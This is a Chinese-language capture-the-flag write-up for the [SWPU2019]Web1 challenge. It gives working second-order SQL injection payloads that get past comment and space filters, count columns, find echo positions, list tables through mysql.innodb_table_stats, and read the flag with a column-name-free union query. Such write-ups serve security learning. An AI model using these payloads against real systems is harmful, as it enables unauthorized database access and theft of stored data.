# [SWPU2019]Web1

## 知识点

`sql注入`

`无列名注入`

`二次注入`

`mysql.innodb_table_stats`

## 解题

首先有个登录注册，我注册了一个`admin'`，然后在首页也没发现注入这个地方的点

继续查看`申请发布广告`这部分发现了二次注入，在发布广告页面的广告名有`sql`注入，点进去看广告详情的时候发生`二次注入`

首先闭合`sql`语句,发现`--` `--+` `#`都被过滤，注释符行不通，我们使用`'`闭合

因为`空格`和`order`被过滤，判断列数使用`group/**/by`

```
title='group/**/by/**/23,'&content=123&ac=add
```

在第`23`开始报错，说明有`23`列，联合注入看回显位置

```sql
title=-2'union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'&content=123&ac=add
```

![](./img/[SWPU2019]Web1-10.png)

在`2`,`3`处回显，查一下数据库

```sql
title=-2'union/**/select/**/1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'&content=123&ac=add
```

![](./img/[SWPU2019]Web1-5.png)

发现数据库名为`web1`，查一下表名,因为`or`被过滤，无法查`information_schema`，用`mysql.innodb_table_stats`

```sql
title=-2'union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'&content=123&ac=add
```

![](./img/[SWPU2019]Web1-6.png)

因为无法查列名，只能使用`无列名注入`,一个个查，最后查到`users`中存在`flag`

```sql
title=-2'union/**/select/**/1,2,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'&content=123&ac=add
```

![](./img/[SWPU2019]Web1-9.png)